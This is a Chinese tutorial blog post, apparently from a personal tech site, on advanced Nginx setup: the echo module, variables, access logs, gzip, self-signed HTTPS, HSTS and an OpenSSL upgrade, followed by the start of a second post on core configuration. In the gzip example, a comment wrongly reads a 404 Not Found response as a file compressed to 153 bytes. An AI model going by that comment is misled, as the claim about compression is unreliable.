--with-http_realip_module \\ --with-http_stub_status_module \\ --with-http_gzip_static_module \\ --with-pcre \\ --with-stream \\ --with-stream_ssl_module \\ --with-stream_realip_module \\ --with-http_perl_module \\ --add-module=/usr/local/src/echo-nginx-module #指定模块源代码路径 [root@centos7 src]# make \u0026amp;\u0026amp; make install root@centos7 nginx-1.18.0]# /apps/nginx/sbin/nginx -t #语法检查通过 nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 nginx-1.18.0]# /apps/nginx/sbin/nginx -V #查看编译后的新版本 nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module --add-module=/usr/local/src/echo-nginx-module #访问测试 [root@centos7 nginx-1.18.0]# nginx [root@centos7 nginx-1.18.0]# curl pc.test.org/main/ hello world--\u0026gt; 172.16.16.88 sub1 sub2 took 2.009 sed for total. Nginx 使用变量 nginx的变量可以在配置文件中引用，作为功能判断或者日志等场景使用\n变量可以分为内置变量和自定义变量\n内置变量是由nginx模块自带，通过变量可以获取到众多的与客户端访问相关的值。\n内置变量 官方文档 http:/nginx.org/en/docs/varindex.html\n常用内置变量\n$remote_addr; #存放了客户端的地址，注意是客户端的公网IP $proxy_add_x_forwarded_for #此变量表示将客户端IP追加请求报文中X-Forwarded-For首部字段,多个IP之间用逗号分隔,如果请求中没有X-Forwarded-For, 就使用$remote_addr the “X-Forwarded-For” client request header field with the $remote_addr variable appended to it, separated by a comma. If the “X-Forwarded-For” field is not present in the client request header, the $proxy_add_x_forwarded_for variable is equal to the $remote_addr variable. $args; #存放了URL中的所有参数，例如:对于http:/www.magedu.org/main/index.do?id=20190221\u0026amp;partner=search $args的值就是：id=20190221\u0026amp;partner=search $document_root; #保存了针对当前资源的请求的系统根目录,例如:/apps/nginx/html。 $document_uri; #保存了当前请求中不包含参数的URI，注意是不包含请求的指令，比如:http:/www.magedu.org/main/index.do?id=20190221\u0026amp;partner=search会被定义为/main/index.do #$document_uri的值为:/main/index.do $host; #存放了请求的host名称 $limit_rate; #如果nginx服务器使用limit_rate配置了显示网络速率，则会显示，如果没有设置， 则显示0 $remote_port; #客户端请求Nginx服务器时随机打开的端口，这是每个客户端自己的端口 $remote_user; #已经经过Auth Basic Module验证的用户名 $request_body_file; #做反向代理时发给后端服务器的本地资源的名称 $request_method; #请求资源的方式，GET/PUT/DELETE等 $request_filename; #当前请求的资源文件的磁盘路径，由root或alias指令与URI请求生成的文件绝对路径，如:/apps/nginx/html/main/index.html $request_uri; #包含请求参数的原始URI，不包含主机名，相当于:$document_uri?$args,例如：/main/index.do?id=20190221\u0026amp;partner=search $scheme; #请求的协议，例如:http，https,ftp等 $server_protocol; #保存了客户端请求资源使用的协议的版本，例如:HTTP/1.0，HTTP/1.1，HTTP/2.0等 $server_addr; #保存了服务器的IP地址 $server_name; #请求的服务器的主机名 $server_port; #请求的服务器的端口号 $http_user_agent; #客户端浏览器的详细信息 $http_cookie; #客户端的所有cookie信息 $cookie_\u0026lt;name\u0026gt; #cookie中某个字段值，name为任意请求报文首部字部cookie的key $http_\u0026lt;name\u0026gt; #name为任意请求报文首部字段,表示记录请求报文的首部字段，name的对应的首部字段名需要为小写，如果有横线需要替换为下划线。 #示例: echo $http_user_agent; echo $http_host; $sent_http_\u0026lt;name\u0026gt; #name为响应报文的首部字段，name的对应的首部字段名需要为小写，如果有横线需要替换为下划线,此变量有问题 #示例： echo $sent_http_server; $arg_\u0026lt;name\u0026gt; #此变量存放了URL中的指定参数，name为请求url中指定的参数名 #示例 echo $arg_id; 范例：\n##站点配置 [root@centos7 ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80 default_server; server_name pc.test.org; location /main { index index.html; default_type text/html; echo $remote_addr; echo $args; echo $document_root; echo $document_uri; echo $host; echo $http_user_agent; echo $http_cookie; echo $request_filename; echo $scheme; echo $scheme:/$host$document_uri?$args; } } ##返回结果 [root@centos7 ~]# curl -b title=test \u0026#39;http:/pc.test.org/main/index.do?id=2022\u0026amp;partner=search\u0026#39; 172.16.16.88 id=2022\u0026amp;partner=search /apps/nginx/html /main/index.do pc.test.org curl/7.29.0 title=test /apps/nginx/html/main/index.do http http:/pc.test.org/main/index.do?id=2022\u0026amp;partner=search 范例：\n##站点配置 [root@centos7 ~]# cat /apps/nginx/conf.d/www.conf server { listen 80; server_name www.test.com; location /echo { echo $request; echo $proxy_add_x_forwarded_for; echo $args; echo $document_uri; echo $request_uri; echo $document_root; echo $host; echo $request_method; echo $request_filename; echo $scheme; set $test $http_host; #自定义变量，将$http_host的值赋给test变量 echo $test; echo $http_User_Agent; echo $http_cookie; echo $cookie_key1; } } ##访问测试 [root@centos7 ~]# curl -b \u0026#39;key1=v1;key2=v2\u0026#39; \u0026#34;http:/www.test.com/echo/index.html?id=666\u0026amp;partner=search\u0026#34; GET /echo/index.html?id=666\u0026amp;partner=search HTTP/1.1 172.16.16.88 id=666\u0026amp;partner=search /echo/index.html /echo/index.html?id=666\u0026amp;partner=search /apps/nginx/html www.test.com GET /apps/nginx/html/echo/index.html http www.test.com curl/7.29.0 key1=v1;key2=v2 v1 自定义变量 语法格式：\nSyntax: set $variable value; Default: — Context: server, location, if 范例：\n##站点配置 [root@centos7 ~]# cat /apps/nginx/conf.d/www.conf server { listen 80; server_name www.test.com; location /echo { set $name test; echo $name; set $my_port $server_port; echo $my_port; echo \u0026#34;server_name:$server_port\u0026#34;; } } ##访问测试 [root@centos7 ~]# curl www.test.com/echo GET /echo HTTP/1.1 172.16.16.88 /echo /echo /apps/nginx/html www.test.com GET /apps/nginx/html/echo http www.test.com curl/7.29.0 Nginx 自定义访问日志 访问日志是记录客户端即用户的具体请求内容信息，而在全局配置模块中的error_log是记录nginx服务器运行时的日志保存路径和日志的level，两者是不同的，而且Nginx的错误日志一般只有一个，但是访问日志可以在不同的server中定义多个。定义访问日志使用access_log指令指定日志保存路径，使用log_format指定日志的格式，格式中定义要保存的具体的日志内容。\n访问日志由 ngx_http_log_module 模块实现\n官方帮助文档：http:/nginx.org/en/docs/http/ngx_http_log_module.html\n语法格式：\nSyntax: access_log path [format [buffer=size] [gzip[=level]] [flush=time] [if=condition]]; access_log off; Default: access_log logs/access.log combined; Context: http, server, location, if in location, limit_except 自定义日志默认格式 如果要保留日志的源格式，只需添加相应的日志内容，配置如下：\nhttp { ... log_format my_nginx_format \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34;\u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34;\u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39; \u0026#39;$server_name:$server_port\u0026#39;; access_log logs/access.log my_nginx_format; ... } #注意：此指令一定要放在log_format命令后（nginx配置从上至下依次生效） access_log logs/access.log my_nginx_format; ##重启nginx访问测试 [root@centos7 nginx]# tail -3 logs/access.log 172.16.16.88 - - [02/Aug/2022:23:51:26 +0800] \u0026#34;GET /echo HTTP/1.1\u0026#34; 200 211 \u0026#34;-\u0026#34; \u0026#34;curl/7.29.0\u0026#34; #默认日志格式 172.16.16.88 - - [04/Aug/2022:19:08:42 +0800] \u0026#34;GET / HTTP/1.1\u0026#34;200 6 \u0026#34;-\u0026#34;\u0026#34;curl/7.29.0\u0026#34; \u0026#34;-\u0026#34;pc.test.org:80 #自定义日志格式my_nginx_format 自定义json格式日志 nginx的默认日志格式记录的内容相对单一，且默认的格式也不方便后期做日志统计分析，生产环境中通常将nginx日志格式为json格式，然后配合ELK做日志收集、统计和分析。\n配置示例：\nhttp { ... log_format json_log \u0026#39;{\u0026#34;@timestamp\u0026#34;:\u0026#34;$time_iso8601\u0026#34;,\u0026#39; \u0026#39;\u0026#34;clientip\u0026#34;:\u0026#34;$remote_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;size\u0026#34;:$body_bytes_sent,\u0026#39; \u0026#39;\u0026#34;responsetime\u0026#34;:$request_time,\u0026#39; \u0026#39;\u0026#34;upstreamtime\u0026#34;:\u0026#34;$upstream_response_time\u0026#34;,\u0026#39; \u0026#39;\u0026#34;upstreamhost\u0026#34;:\u0026#34;$upstream_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;http_host\u0026#34;:\u0026#34;$host\u0026#34;,\u0026#39; \u0026#39;\u0026#34;uri\u0026#34;:\u0026#34;$uri\u0026#34;,\u0026#39; \u0026#39;\u0026#34;xff\u0026#34;:\u0026#34;$http_x_forwarded_for\u0026#34;,\u0026#39; \u0026#39;\u0026#34;referer\u0026#34;:\u0026#34;$http_referer\u0026#34;,\u0026#39; \u0026#39;\u0026#34;tcp_xff\u0026#34;:\u0026#34;$proxy_protocol_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;http_user_agent\u0026#34;:\u0026#34;$http_user_agent\u0026#34;,\u0026#39; \u0026#39;\u0026#34;status\u0026#34;:\u0026#34;$status\u0026#34;}\u0026#39;; access_log logs/access.log json_log; ... } ##重启nginx，查看生成的日志格式 [root@centos7 nginx]# tail -1 logs/access.log {\u0026#34;@timestamp\u0026#34;:\u0026#34;2022-08-04T19:27:18+08:00\u0026#34;,\u0026#34;clientip\u0026#34;:\u0026#34;127.0.0.1\u0026#34;,\u0026#34;size\u0026#34;:6,\u0026#34;responsetime\u0026#34;:0.000,\u0026#34;upstreamtime\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;upstreamhost\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;http_host\u0026#34;:\u0026#34;localhost\u0026#34;,\u0026#34;uri\u0026#34;:\u0026#34;/index.html\u0026#34;,\u0026#34;xff\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;referer\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;tcp_xff\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;http_user_agent\u0026#34;:\u0026#34;curl/7.29.0\u0026#34;,\u0026#34;status\u0026#34;:\u0026#34;200\u0026#34; Nginx 压缩功能 Nginx支持对指定类型的文件进行压缩然后再传输给客户端，而且压缩还可以设置压缩比例，压缩后的\n文件大小将比源文件显著变小，这样有助于降低出口带宽的利用率，降低企业的IT支出，不过会占用相\n应的CPU资源。\nNginx对文件的压缩功能是依赖于模块 ngx_http_gzip_module,默认是内置模块\n官方文档：https:/nginx.org/en/docs/http/ngx_http_gzip_module.html\n格式：\nSyntax:\tgzip on | off; Default:\tgzip off; Context:\thttp, server, location, if in location 相关指令：\n#启用或禁用gzip压缩，默认关闭 gzip on | off; #压缩比由低到高从1到9，默认为1 gzip_comp_level level; #禁用IE6 gzip功能 gzip_disable \u0026#34;MSIE [1-6]\\.\u0026#34;; #gzip压缩的最小文件，小于设置值的文件将不会压缩 gzip_min_length 1k; #启用压缩功能时，协议的最小版本，默认HTTP/1.1 gzip_http_version 1.0 | 1.1; #指定Nginx服务需要向服务器申请的缓存空间的个数和大小,平台不同,默认:32 4k或者16 8k; gzip_buffers number size; #指明仅对哪些类型的资源执行压缩操作;默认为gzip_types text/html，不用显示指定，否则出错 gzip_types mime-type ...; #如果启用压缩，是否在响应报文首部插入“Vary: Accept-Encoding”,一般建议打开 gzip_vary on | off; #预压缩，即直接从磁盘找到对应文件的gz后缀的式的压缩文件返回给用户，无需消耗服务器CPU #注意: 来自于ngx_http_gzip_static_module模块 gzip_static on | off; 示例：\n##分别生成5Bytes 大小的index.html文件以及2k大小的2k.text [root@centos7 ~]# echo test \u0026gt; /apps/nginx/html/pc/index.html [root@centos7 ~]# dd if=/dev/zero of=/apps/nginx/html/pc/2k.text bs=2k count=1 1+0 records in 1+0 records out 2048 bytes (2.0 kB) copied, 0.000405459 s, 5.1 MB/s [root@centos7 ~]# ll /apps/nginx/html/pc/2k.text -h -rw-r--r-- 1 root root 2.0K Aug 4 20:01 /apps/nginx/html/pc/2k.text [root@centos7 ~]# ll /apps/nginx/html/pc/index.html -h -rw-r--r-- 1 nginx nginx 5 Aug 4 19:43 /apps/nginx/html/pc/index.html #准备站点配置 [root@centos7 ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80 default_server; server_name pc.test.org; gzip on; gzip_comp_level 5; gzip_min_length 1k; #小于1k的文件不压缩 gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/gif image/png; gzip_vary on; location / { index index.html; default_type text/html; root html/pc; } } [root@centos7 ~]# nginx -s reload [root@centos7 ~]# curl -I --compressed pc.test.org/index.html HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Thu, 04 Aug 2022 12:02:22 GMT Content-Type: text/html Content-Length: 5 #index.html文件未压缩，仍是5Bytes Last-Modified: Thu, 04 Aug 2022 11:43:47 GMT Connection: keep-alive Keep-Alive: timeout=60 ETag: \u0026#34;62ebb0f3-5\u0026#34; Accept-Ranges: bytes [root@centos7 ~]# curl -I --compressed pc.test.org/2k.txt HTTP/1.1 404 Not Found Server: nginx/1.18.0 Date: Thu, 04 Aug 2022 12:02:34 GMT Content-Type: text/html Content-Length: 153 #2k.txt被压缩为153Bytes Connection: keep-alive Keep-Alive: timeout=60 Nginx 配置https https 相关参数 nginx 的https 功能基于模块ngx_http_ssl_module实现，作为nginx的核心功能，yum安装的nginx默认就是开启的，编译安装的nginx需要指定编译参数\u0026ndash;with-http_ssl_module开启。\n官方文档：https:/nginx.org/en/docs/http/ngx_http_ssl_module.html\n相关指令：\n#为指定的虚拟主机配置是否启用ssl功能，此功能在1.15.0废弃，使用listen [ssl]替代 ssl on | off; listen 443 ssl; #指向包含当前虚拟主机和CA的两个证书信息的文件，一般是crt文件 ssl_certificate /path/to/file; #当前虚拟主机使用的私钥文件，一般是key文件 ssl_certificate_key /path/to/file; #支持ssl协议版本，早期为ssl现在是TLS，默认为后三个 #配置ssl缓存 ssl_session_cache off | none | [builtin[:size]] [shared:name:size]; off： #关闭缓存 none: #通知客户端支持ssl session cache，但实际不支持 builtin[:size]：#使用OpenSSL内建缓存，为每worker进程私有 [shared:name:size]：#在各worker之间使用一个共享的缓存，需要定义一个缓存名称和缓存空间大小，一兆可以存储4000个会话信息，多个虚拟主机可以使用相同的缓存名称 #客户端连接可以复用ssl session cache中缓存的有效时长，默认5m ssl_session_timeout time; 自签名证书 生成自签名证书\n##进入nginx安装目录，新建存放证书的目录 [root@centos7 ~]# cd /apps/nginx/ [root@centos7 nginx]# mkdir certs [root@centos7 nginx]# cd certs/ ##生成自签名CA证书ca.crt和私钥ca.key [root@centos7 certs]# openssl req -newkey rsa:4096 -nodes -sha256 -keyout ca.key -x509 -days 3650 -out ca.crt Generating a 4096 bit RSA private key ...........................................................................................++ ................................................................................................................................................................................++ writing new private key to \u0026#39;ca.key\u0026#39; ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter \u0026#39;.\u0026#39;, the field will be left blank. ----- Country Name (2 letter code) [XX]:cn State or Province Name (full name) []:sichuan Locality Name (eg, city) [Default City]:chengdu Organization Name (eg, company) [Default Company Ltd]:nginx Organizational Unit Name (eg, section) []:nginx.com Common Name (eg, your name or your server\u0026#39;s hostname) []:www.nginx.com Email Address []:22@qq.com [root@centos7 certs]# ls ca.crt ca.key ##生成网站私钥www.nginx.com.key和证书请求www.nginx.com.csr [root@centos7 certs]# openssl req -newkey rsa:4096 -nodes -sha256 -keyout www.nginx.com.key -out www.nginx.com.csr Generating a 4096 bit RSA private key .......++ ...................................................................................++ writing new private key to \u0026#39;www.nginx.com.key\u0026#39; ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter \u0026#39;.\u0026#39;, the field will be left blank. ----- Country Name (2 letter code) [XX]:cn #国家 State or Province Name (full name) []:sichuan #省份 Locality Name (eg, city) [Default City]:chengdu #城市 Organization Name (eg, company) [Default Company Ltd]:nginx #公司 Organizational Unit Name (eg, section) []:nginx.com #部门 Common Name (eg, your name or your server\u0026#39;s hostname) []:www.nginx.com #通用名 Email Address []:511670559@qq.com #邮箱 Please enter the following \u0026#39;extra\u0026#39; attributes to be sent with your certificate request A challenge password []: An optional company name []: [root@centos7 certs]# ls www* www.nginx.com.csr www.nginx.com.key www.nginx.crt ##使用ca签发网站的证书www.nginx.crt [root@centos7 certs]# openssl x509 -req -days 3650 -in www.nginx.com.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out www.nginx.com.crt Signature ok subject=/C=cn/ST=sichuan/L=chengdu/O=nginx/OU=nginx.com/CN=www.nginx.com/emailAddress=511670559@qq.com Getting CA Private Key [root@centos7 certs]# ls ca.crt ca.key ca.srl www.nginx.com.crt www.nginx.com.csr www.nginx.com.key ##查看证书内容 [root@centos7 certs]# openssl x509 -in www.nginx.com.crt -noout -text Certificate: Data: Version: 1 (0x0) Serial Number: f5:49:30:f5:10:2f:4b:ea Signature Algorithm: sha256WithRSAEncryption Issuer: C=cn, ST=sichuan, L=chengdu, O=nginx, OU=nginx.com, CN=www.nginx.com/emailAddress=22@qq.com Validity Not Before: Aug 4 14:48:57 2022 GMT Not After : Aug 1 14:48:57 2032 GMT Subject: C=cn, ST=sichuan, L=chengdu, O=nginx, OU=nginx.com, CN=www.nginx.com/emailAddress=511670559@qq.com Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (4096 bit) ... ## 将ca证书和网站证书输出到一个文件（注意前后次序） [root@centos7 certs]# cat www.nginx.com.crt ca.crt \u0026gt; www.nginx.com.pem https 配置 ##准备站点配置文件 [root@centos7 certs]# cat /apps/nginx/conf.d/pc.conf server { listen 80; listen 443 ssl; server_name pc.test.org; location / { index index.html; default_type text/html; root html/pc; } ssl_certificate /apps/nginx/certs/www.nginx.com.pem; ssl_certificate_key /apps/nginx/certs/www.nginx.com.key; ssl_session_cache shared:sslcache:20m; } ##重启nginx [root@centos7 certs]# nginx -t nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 certs]# nginx -s reload 浏览器访问测试，由于是自签名证书，浏览器并不信任\n实现多域名 https Nginx 支持基于单个IP实现多域名的功能，并且还支持单IP多域名的基础之上实现HTTPS，其实是基于Nginx的 SNI（Server Name Indication）功能实现，SNI是为了解决一个Nginx服务器内使用一个IP绑定多个域名和证书的功能。其实现流程是客户端在连接到服务器建立SSL链接之前先发送要访问站点的域名（Hostname），这样服务器再根据这个域名返回给客户端一个合适的证书。\n简单来说，SNI实现了为多个虚拟主机配置各自的https认证功能，配置方式和上一节内容类似，这里不做演示。\n查看nginx支持SNI功能：\n[root@centos7 nginx]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled #支持SNI功能 configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module --add-module=/usr/local/src/echo-nginx-module 实现 HSTS 官方文档：https:/www.nginx.com/blog/http-strict-transport-security-hsts-and-nginx/\n未配置http跳转的情况时：\n实例：\n# 站点配置 [root@centos7 conf.d]# cat pc.conf server { listen 80; listen 443 ssl; ssl_certificate /apps/nginx/certs/www.nginx.com.pem; ssl_certificate_key /apps/nginx/certs/www.nginx.com.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; server_name pc.test.org; location / { index index.html; default_type text/html; root html/; } } #http访问成功 [root@centos7 conf.d]# curl www.test.org default #https请求报错 [root@centos7 conf.d]# curl www.test.org:443 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;400 The plain HTTP request was sent to HTTPS port\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;400 Bad Request\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;center\u0026gt;The plain HTTP request was sent to HTTPS port\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 配置rewrite实现http跳转https后：\n范例：\n##站点配置 [root@centos7 conf.d]# cat pc.conf server { listen 80; listen 443 ssl; ssl_certificate /apps/nginx/certs/www.nginx.com.pem; ssl_certificate_key /apps/nginx/certs/www.nginx.com.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; server_name pc.test.org; add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains\u0026#34; always; #开启客户端缓存功能，当发起http请求时优先访问缓存，直接进行本地http跳转 location / { index index.html; default_type text/html; root html/; #配置http跳转https if ( $scheme = http ) { rewrite ^/(.*)$ https:/www.test.org/$1 redirect; } } } #发起http请求，返回响应码为302 [root@centos7 conf.d]# curl pc.test.org \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;302 Found\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;302 Found\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; [root@centos7 conf.d]# curl pc.test.org -L #跟踪302重定向后又报证书校验错误 curl: (60) Peer\u0026#39;s certificate issuer has been marked as not trusted by the user. More details here: http:/curl.haxx.se/docs/sslcerts.html curl performs SSL certificate verification by default, using a \u0026#34;bundle\u0026#34; of Certificate Authority (CA) public keys (CA certs). If the default bundle file isn\u0026#39;t adequate, you can specify an alternate file using the --cacert option. If this HTTPS server uses a certificate signed by a CA represented in the bundle, the certificate verification probably failed due to a problem with the certificate (it might be expired, or the name might not match the domain name in the URL). If you\u0026#39;d like to turn off curl\u0026#39;s verification of the certificate, use the -k (or --insecure) option. # 发起http请求，自动跳转https成功 [root@centos7 conf.d]# curl pc.test.org -kL #跟随重定向并忽略证书安全性检查，请求成功 default 关于 favicon.io favicon.ico 文件是网站标签页的小图标，当客户端使用浏览器问页面时，浏览器会自己主动发起请求获取页面的favicon.ico文件，但是当浏览器请求的favicon.ico文件不存在时，服务器会记录404日志，而且浏览器也会显示404报错\n图标位置：\n报错如下：\n[root@centos7 nginx]# tail -1 logs/error.log # 日志中的报错 2022/08/05 17:47:54 [error] 2604#0: *200 open() \u0026#34;/apps/nginx/html/favicon.ico\u0026#34; failed (2: No such file or directory), client: 172.16.16.1, server: pc.test.org, request: \u0026#34;GET /favicon.ico HTTP/1.1\u0026#34;, host: \u0026#34;pc.test.org\u0026#34;, referrer: \u0026#34;http:/pc.test.org/\u0026#34; [root@centos7 nginx]# ls /apps/nginx/html/favicon.ico # 文件确实不存在 ls: cannot access /apps/nginx/html/favicon.ico: No such file or directory 解决方案：\n#将自己的图标命令为favicon.ico放置于指定目录下 [root@centos7 html]# wget https:/gitee.com/favicon.ico -P /apps/nginx/html/ [root@centos7 html]# ll /apps/nginx/html/favicon.ico -rw-r--r-- 1 root root 41566 Jun 10 11:59 /apps/nginx/html/favicon.ico 访问测试（浏览器按快捷键 CTRL+F5 强制刷新）\nOpenSSL版本升级 OpenSSL程序库当前广泛用于实现互联网的传输层安全（TLS）协议。心脏出血（Heartbleed），也简\n称为心血漏洞，是一个出现在加密程序库OpenSSL的安全漏洞，此漏洞于2012年被引入了软件中，\n2014年4月首次向公众披露。只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可\n能因此而受到攻击。此问题的原因是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检\n查），因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过读，即可以读取的数据比应该允许读取的还多。\n范例：升级OpenSSL解决安全漏洞\n[root@centos7 ~]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 #当前OpenSSL版本 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module --add-module=/usr/local/src/echo-nginx-module ##下载较新版本OpenSSL源码包 [root@centos7 ~]# cd /usr/local/src/ [root@centos7 src]# wget https:/www.openssl.org/source/openssl-1.1.1h.tar.gz --no-check-certificate [root@centos7 src]# tar xf openssl-1.1.1h.tar.gz ##编译安装OpenSSL [root@centos7 src]# cd /usr/local/src/nginx-1.18.0/ [root@centos7 nginx-1.18.0]# ./configure --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module --add-module=/usr/local/src/echo-nginx-module --with-openssl=/usr/local/src/openssl-1.1.1h #注意OpenSSL路径要添加正确 [root@centos7 nginx-1.18.0]# make \u0026amp;\u0026amp; make install #语法检查通过 [root@centos7 nginx-1.18.0]# nginx -t nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 nginx-1.18.0]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.1.1h 22 Sep 2020 #版本升级成功 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module --add-module=/usr/local/src/echo-nginx-module --with-openssl=/usr/local/src/openssl-1.1.1h ","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/","summary":"\u003cp\u003eNginx 高级配置及第三方模块\u003c/p\u003e","title":"Nginx高级配置"},{"content":"主要介绍Nginx核心配置文件\n配置文件说明 nginx 官方文档：http://nginx.org/en/docs/\nnginx 配置文件组成： 主配置文件： nginx.conf 子配置文件： conf.d/*.conf fastcgi,， uwsgi，scgi 等协议的相关配置文件 mime.types：支持的mime类型，MIME（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型，MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据，是设定某种扩展名的文件用指定应用程序来打开的方式类型，当带有某种扩展名的文件被访问的时候，浏览器会自动使用指定应用程序打开（比如：应用程序会被下载，文本文件会直接显示内容）。简单来说，MIME就是利用扩展名标识文件类型，然后根据文件的类型做响应的处理。MIME 参考文档：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types nginx 配置文件格式说明： 配置文件由指令和指令块构成 每条指令以分号；结束，指令和值之间以空格分隔 多条指令可以放在同一行，以分号分隔。但可读性差，不推荐这样配置 指令块以{ } 括号作为开始和结束的标识，将多条指令组织在一起，且支持嵌套 可通过include引入其他配置文件内容，提升配置文件的可维护性（如子配置文件conf.d/*.conf) 配置文件使用# 作为注释符，使用$引用变量 部分指令的参数支持正则表达式 nginx 主配置文件指令格式： directive value [value1 ...]; 说明： 1、指令必须以分号；结束 2、支持变量： 1）内建变量：由Nginx模块引入，可直接引用 2）自定义变量：由用户使用set指定定义，格式： set variable_name value; 3) 引用变量的方式：$variable_name 主配置文件结构：四部分 main block：主配置段，即全局配置段，对http,mail都有效 #事件驱动相关的配置 event { ... } #http/https 协议相关配置段 http { ... } #默认配置文件不包括下面两个块 #mail 协议相关配置段 mail { ... } #stream 服务器相关配置段 stream { ... } 默认的nginx.conf 配置文件说明\n##全局配置块，对全局生效。主要设置nginx的启动用户/组，启动的工作进程数量，工作模式，nginx的pid文件路径等。 user nginx nginx; worker_processes 1; #启动工作进程的数量，一般与CPU核心数一致 ##events块，主要影响nginx服务器与用户的网络连接，比如是否允许同时接受多个网络连接，使用哪种事件驱动模型，每个工作进程最大支持并发连接数，是否开启对多工作进程下的网络连接进行序列化等。 events { worker_connections 1024; #单个worker进程的最大并发连接数。作为web服务器时，nginx的最大并发数为：worker_connections * worker_processes。作为反向代理的时候为（worker_connections * worker_processes）/2 } ##http块是nginx服务器配置中的重要组成部分，缓存、代理和日志格式定义等绝大多数功能和第三方模块都在这里配置。http块可以包含多个server块，而一个server块又可以包含多个location块，server块可以配置文件引入、MIME-Type定义、日志自定义、是否启用sendfile、连接超时时间和单个链接的请求上限等。 http { include\tmime.types; default_type application/ostet-stream; sendfile\ton; #作为web服务器时打开sendfile加快静态文件传输，指定是否使用sendfile系统调用传输文件。sendfile系统调用在两个文件描述符之间直接传递数据（完全在内核空间进程），从而避免了数据在内核缓冲区和用户缓冲区之间的拷贝，效率很高，是零拷贝技术的一种。 keepalive_timeout 65; #长连接超时时间，单位：秒 ##server块可用于配置虚拟主机，有自己的全局配置，可以包含多个location块。可配置本虚拟机监听的端口，设置虚拟机名称，多个server监听同一个端口。 server { listen 80; #监听端口 